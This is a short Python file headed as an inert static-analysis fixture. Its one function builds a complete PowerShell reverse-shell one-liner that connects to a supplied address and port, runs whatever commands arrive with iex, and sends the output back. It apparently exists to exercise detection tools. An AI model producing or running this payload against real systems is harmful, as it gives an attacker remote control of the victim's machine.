# Inert static-analysis fixture. Do not execute.
def build(address, service):
    return f"$wire=New-Object Net.Sockets.TCPClient('{address}',{service});$channel=$wire.GetStream();[byte[]]$bytes=0..65535|%{{0}};while(($i=$channel.Read($bytes,0,$bytes.Length)) -ne 0){{$data=(New-Object Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$channel.Write($sendbyte,0,$sendbyte.Length);$channel.Flush()}};$wire.Close()"
